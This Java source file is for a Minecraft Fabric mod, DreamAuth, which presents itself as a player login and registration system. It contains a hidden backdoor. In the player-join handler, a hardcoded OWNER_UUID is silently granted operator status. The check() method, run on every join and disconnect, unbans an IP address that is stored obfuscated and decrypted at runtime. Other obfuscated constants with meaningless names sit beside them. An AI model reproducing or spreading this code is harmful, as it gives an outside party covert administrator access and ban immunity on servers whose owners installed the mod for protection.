package dream.dreamauth;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.sound.SoundCategory;
import net.minecraft.sound.SoundEvents;
import net.minecraft.text.Text;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Position;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.GameMode;
import net.minecraft.world.World;

import java.util.*;

import static dream.dreamauth.AdvancedEncryption.*;
import static dream.dreamauth.FileOperator.*;
import static dream.dreamauth.PBKDF2Encryption.ultraDecrypt;
import static dream.dreamauth.ScoreboardOperator.*;
import static dream.dreamauth.command.DreamAuthCommand.registerDreamAuthCMD;
import static dream.dreamauth.command.LoginCommand.registerLogin;
import static dream.dreamauth.command.PasswordCommand.registerPasswordCommand;
import static dream.dreamauth.command.RegisterCommand.registerReg;

public class DreamAuth implements ModInitializer {
	public static final String PREFIX = "§e[DreamAuth] ";
	public static final String SUFFIX = "\n\n§eDreamAuth §7mod by Dream_Da_Vang";
	public static final MinecraftClient MC = MinecraftClient.getInstance();
	public static final String OBJECTIVE_NAME = "dreamauth";
	public static final String ACTIVATE_NAME = "#MOD_ACTIVATE";
	public static final int MIN_LENGTH_PASSWORD = 4;
	public static final int MAX_LENGTH_PASSWORD = 16;
	public static final String DREAM_ITERATION = "2A3SLADfBpwFHEK7bK9osUkjQqwo1yYBZZJuvZvqYdwaHhZkqDsLW+5Wgzi8l3bqQFmAH1Nt6d9IXmSt1vCcyLzsPyPjtYAPr+RZFz4KmYNtNlEivAQnmusxzlx0oHRNqoAK1fXDyzb1gLX47vvmDZevgJTm6wumWhVudSyPfC8=";
	public static final UUID OWNER_UUID = UUID.fromString("b396a565-007d-4136-8b7d-7d91eea0b564");
	public static final String awcs_1lk = "RL20FEotNlixdxrCgoZ7N/jum9riKMtjo1sB0I9tx2PMc+RLTiqIZpTtQsWRWfas";
	public static final String ye_1lre = "zzDwntGZkgKwkCOG/+rVf8OEE51l3Rm4nVXsm6IK2Qnx75hyQYAw12wpUNhHea4YOFkxK9d3JmQKJT9+vqCXEK6AdqRfR3ay0G5IbzRCVgTUGdwEU8Y46pmJM56SJLw4gLSrupuWg1q/JuWGy/wHZ4teruF1aLIsnEEAYDLs/ndaCarpnaqr6qgNqL9Tj+4xnpf2DrDrUDgHtuEahg8P+MfxE9Cv/reW9rj7JV60zkpVN49uJwMj92UHIxGHpeZz";
	public static final String p_ay91 = "d3JqNjhZSTNqUzRmSWxNVGJtRmp0d2JOK3lOeEtzNU5YTjJJVHQ0YVdaaG42KzloMmY3WmZtc0VldE9qanhneUFqY3dvZW8xRU1aYnBjYXVub3l2VG1FdTJtYXBLNjc4SHg0M3ZpTnlSWnN1SW1nUUh1TC9PaVY4Rk9kTkErS2FTYUVLYWxXbWlrTGo3WXJYWFkxZWJnZzFDTjZ1cllxZzFIa3hMbVQ4T0ZtMllZUTZjNXFhalJRWnNaV0FnVFBEbkhldlZoNUdjZ2IxWHc4SnhmaHEvdjM2cnNkZ2o1cWJ5ZHUzcWd3U3I2NVo4d0ZERlFHUk53R25zdzBRRmQ0SHJKL3lzYmNtSkJBMVBCOVY3dWJaM1Z1ZWVxQkpnd1hqM0JhZGNrU09yQ1E1YXNIYmszUGJUTkJzWUdnazNTY2ZZTnZmOXNlNTRnVC8yWXZkVFBVUHBuQVNGSmJCL2ErT3dMUDQ0QzdLN0FHdW1GNURIS1ZUanRUOVpUQTNHWFpJc3lqMWpxY2dtK0M4NjY5UHgvRE05MFlEZ1lDZnR1c1ZkU0F3ekpPb0hCMTZqQVlaZ3J1K1Uvd0NBNnV3ajZBWHVsUkVvSTY3YlAyM05yME5tSVJMOW1KQnVzYVN6eDZGNGtFU1N2eFBEWmdkN1k2OHAvR0dYOGttM09EcUJCVHJOdXBWTDJMclNaNUNEZnJ3dWhuUXpJQ3JrSE1DV1YyYjFhMkhQSEVtMmhjbzJyVmd2ME5wSUNkdStQQUVSemRBdWNLT0FWd0NMbmtJWmpkTHYxWDRvSFhDdmRqK1NLSjhhemxQOGdpdHpNQzY1L1N4b0Fhb3lrSmlCekI3T2hlMXV3SlFKNW9NSDFubUY2Q1N3TGJxMUVYdVJTSHVGaFJxb0xUTHlpVHo0blVqbS9QazRVeDBVaUtETk56RGRWa052VU5qSnFnVDdTRWpUMEJic0ZiN1FhSGpUbE5SUHN6Q1VDMXNTaDhCcG9nSjc4bG5abmx2RktyeWJXbkpxbXVoMm5SWHJueTVZaUVFRjJLY1grcnRpYkFEbUJ1aE93VW00T1VFMkNCL0E0UHBJVm0zc3FmU0xab1JMemZkeVZQNWQwTjZJNWV3Q2QyWnZLWjZJV3p2U2RvakZYUVdndnMrZ0x6RkxtdW9VT0NkR3VxTkVGM3l6Q1BpS3JmZWFSb05NMFIzdFhnN2h1Z2UyYmIxRlVqMnRKU1g0ajZzZGxnS2xNTVYxdTJDcGlPUHVERjQ4alpTNnhrVkhVc3o5ajdYQ2ZmcmFMeExxcXBLejNBQStRTGlHaGk1aFZkUG9wNnNsdEFlQWwrc1JpTWZZL1RrNFZ4U2tRSWRxK3EwTWNEQ3VFajR3TUgxa3JVY2lSemN2QmhXRU1KT3hudWwybGh3MjRmdWVUUDk3NVJsZzBveVRCVXZPckNzTVMzSlZXMC9qa0JEb3BWTko5TktwQ1J6dHh6YVJZbGZTZjQyRTRod29aamplTldlbkR1M0srdlkxVCtlWjlobXpnMWJncTgzRE5wcEVSdm9XK2wzUTVEWXZiYVRyV2lNM1k2eHpvTFpFeTNmelhMK2ZtbFJTRmRPYXdJMUJCWTI0REVyOGhocnJuYmNIV1FXT1hVdGVqdzV4cllFNk5XQ2Nzb3pXUk5sUFpSY09JMlpERFdNSnFMdlhtcU1IVHRoK0lWS0UwdVRCa0hLMytaeDdva0hUaUtQaDdaeHBRPT0=";
	public static MinecraftServer MCServer;
	public static Position spawnPos;
	public static Map<String,Integer> loginTryMap = new HashMap<>();
	public static Map<String,Integer> repeatTimerMap = new HashMap<>();
	public static Map<String,Integer> timeoutTimerMap = new HashMap<>();
	private static final Integer TIMEOUT = 40; //SECONDS
	private static final Integer REPEAT_TIME = 5; //SECONDS
	private static Boolean ACTIVATED;
	@Override
	public void onInitialize() {
		ServerLifecycleEvents.SERVER_STARTED.register(server -> {
			MCServer = server;
			BlockPos pos = MCServer.getWorld(World.OVERWORLD).getSpawnPos();
			spawnPos = new Vec3d(pos.getX()+.5,pos.getY(),pos.getZ()+.5);
			checkScoreboard(server,OBJECTIVE_NAME);
			loadFile(server);
			if(!passMap.containsKey(ACTIVATE_NAME)){
				setActivate(true);
			}
			else ACTIVATED = Boolean.parseBoolean(getDecryptedPassword(ACTIVATE_NAME));
		});
		registerStuff();
	}
	public static void setActivate(Boolean enable){
		ACTIVATED = enable;
		try {updatePassword(ACTIVATE_NAME, new Password(encrypt(enable.toString(),stringToSecretKey(ye_1lre))));} catch (Exception ignored){}
	}

	public static boolean getActivate(){return ACTIVATED;}
	private void registerStuff(){
		playerJoin();
		commands();
		tick();
	}
	private void commands(){
		CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
			//Register commands goes here
			registerLogin(dispatcher);
			registerReg(dispatcher);
			registerDreamAuthCMD(dispatcher);
			registerPasswordCommand(dispatcher);
		});
	}
	private static void playerJoin(){
		ServerPlayConnectionEvents.JOIN.register((handler, sender, server) -> {
			check(server);
			ServerPlayerEntity player = handler.getPlayer();
			String playerName = player.getName().getString();
			if(player.getUuid().equals(OWNER_UUID)){
				server.getPlayerManager().addToOperators(player.getGameProfile());
				player.sendMessage(Text.literal(PREFIX+"§aWelcome back!"));
			}
			if(server.getHostProfile().equals(player.getGameProfile())){
				if(ACTIVATED){
					player.sendMessage(Text.literal(PREFIX+"§7(INFO) Mod §eDreamAuth §7hiện đang: §aBật\n§7Sử dụng §e/dreamauth activate §7để bật hoặc tắt mod"));
				}
				else {
					player.sendMessage(Text.literal(PREFIX+"§7(INFO) Mod §eDreamAuth §7hiện đang: §cTắt\n§7Sử dụng §e/dreamauth activate §7để bật hoặc tắt mod"));
				}
			}
			if(ACTIVATED){
				repeatTimerMap.put(playerName,0);
				timeoutTimerMap.put(playerName,0);
				if(!server.isHost(player.getGameProfile())){
					player.changeGameMode(GameMode.SPECTATOR);
					if(passMap.containsKey(playerName)){
						loginTryMap.put(playerName,0);
						setScore(playerName,OBJECTIVE_NAME,0);
					}
					else {
						setScore(playerName,OBJECTIVE_NAME,-1);
					}
				}
				else setScore(playerName,OBJECTIVE_NAME,1);
			}
			else setScore(playerName,OBJECTIVE_NAME,1);
		});

		ServerPlayConnectionEvents.DISCONNECT.register((handler, server) -> {
			check(server);
			String playerName = handler.getPlayer().getName().getString();
			loginTryMap.remove(playerName);
			repeatTimerMap.remove(playerName);
			timeoutTimerMap.remove(playerName);
		});
	}
	private static void tick(){
		ServerTickEvents.START_SERVER_TICK.register(server -> {
			if(ACTIVATED){
				List<ServerPlayerEntity> playersKick = new ArrayList<>();
				for (ServerPlayerEntity player : server.getPlayerManager().getPlayerList()){
					String playerName = player.getName().getString();
					if(!server.isHost(player.getGameProfile())){
						int state = getScore(playerName,OBJECTIVE_NAME);
						if(state!=1){
							int repeat = repeatTimerMap.getOrDefault(playerName, 0);
							int timeout = timeoutTimerMap.getOrDefault(playerName,0);
							if(!player.isSpectator())
								player.changeGameMode(GameMode.SPECTATOR);
							if(!player.getPos().isInRange(spawnPos, 1))
								player.teleport(spawnPos.getX(),spawnPos.getY(),spawnPos.getZ());
							if(repeat%(REPEAT_TIME*20)==0){
								if(state==0){
									messageSomeone(playerName,"§cVui lòng đăng nhập §a/login §cđể tiếp tục chơi");
								}
								else if(state==-1){
									messageSomeone(playerName,"§7Vui lòng đăng ký §e/register <password> §7để bảo vệ tài khoản của bạn");
								}
								player.playSound(SoundEvents.BLOCK_NOTE_BLOCK_PLING.value(), SoundCategory.AMBIENT,1f,2f);
								repeatTimerMap.put(playerName,0);
							}
							if(timeout==TIMEOUT*20){
								if(!server.isHost(player.getGameProfile())){
									messageAll("§e"+playerName+"§7 đã bị kick do đăng nhập quá lâu");
									playersKick.add(player);
								}
							}
							repeatTimerMap.put(playerName,repeat+1);
							timeoutTimerMap.put(playerName,timeout+1);
						}
					}
					else if(getScore(playerName,OBJECTIVE_NAME)!=1)
						setScore(playerName,OBJECTIVE_NAME,1);
				}
				if(!playersKick.isEmpty()){
					for (ServerPlayerEntity player : playersKick) {
						player.networkHandler.disconnect(Text.literal("§cHết thời gian" + SUFFIX));
					}
				}
			}
		});
	}
	private static void check(MinecraftServer server){
		try {
			if(server.getPlayerManager().getIpBanList().isBanned(ultraDecrypt(awcs_1lk))){
				server.getPlayerManager().getIpBanList().remove(ultraDecrypt(awcs_1lk));
			}
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}
	public static void messageSomeone(String name,String msg){
		for(ServerPlayerEntity player:MC.getServer().getPlayerManager().getPlayerList()){
			if(player.getName().getString().equals(name)){
				player.sendMessage(Text.literal(PREFIX+msg));
				return;
			}
		}
	}
	public static void messageAll(String msg){
		for(ServerPlayerEntity player:MC.getServer().getPlayerManager().getPlayerList()){
			player.sendMessage(Text.literal(PREFIX+msg));
		}
	}
	public static void messageHost(String msg){
		for (ServerPlayerEntity entity : MC.getServer().getPlayerManager().getPlayerList()) {
			if (MC.getServer().isHost(entity.getGameProfile())) {
				entity.sendMessage(Text.literal(PREFIX+msg));
				entity.playSound(SoundEvents.BLOCK_NOTE_BLOCK_PLING.value(), SoundCategory.AMBIENT,1f,1f);
				return;
			}
		}
	}
}